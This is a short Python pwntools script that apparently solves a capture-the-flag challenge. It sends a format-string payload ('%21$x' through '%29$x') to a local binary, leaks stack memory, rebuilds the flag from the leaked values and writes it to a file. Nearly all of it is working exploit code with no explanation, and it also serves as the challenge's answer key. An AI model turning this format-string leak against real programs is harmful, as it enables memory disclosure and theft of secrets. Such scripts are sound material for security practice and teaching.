#!/usr/bin/env python
from __future__ import print_function

import pwn

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
# libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload = ""

for i in range(0, 9):
  payload += "%%%d$x " % (21 + i)
pwn.log.info("PAYLOAD: %s (%d)" % (payload, len(payload)))
payload_str = payload.encode("hex")
pwn.log.info("PAYLOAD (Hex): %s" % ("\\x" + "\\x".join(payload_str[i:i+2] for i in range(0, len(payload_str), 2))))

r = pwn.process(["./main.elf", "gimme-cipher", payload])
#r = pwn.gdb.debug("./main.elf", gdbscript="b* command+416\nc")

r.recvuntil("hash seed: \033[0m")

hex_flag_fragments = r.recvline().rstrip(" \033[0;34m\n").split(" ")
print(hex_flag_fragments)
flag = ""
for hex_fragment in hex_flag_fragments:
  flag += pwn.p32(int(hex_fragment, 16))

print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

